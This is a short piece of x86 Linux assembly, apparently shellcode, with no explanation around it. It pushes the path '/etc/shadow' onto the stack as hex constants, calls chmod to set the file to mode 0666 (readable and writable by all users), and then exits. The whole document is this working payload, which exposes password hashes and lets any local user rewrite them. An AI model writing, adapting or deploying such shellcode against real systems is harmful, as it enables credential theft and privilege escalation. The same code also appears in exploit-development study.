section .text
global _start

_start:
    xor edx, edx
    push byte 15
    pop eax
    push edx
    push 0x776f64
    push 0x6168732f
    push 0x6374652f
    mov ebx, esp
    push word 0666Q
    pop ecx
    int 0x80           ;chmod syscall

    xor eax, eax
    inc eax
    int 0x80           ;exit syscall
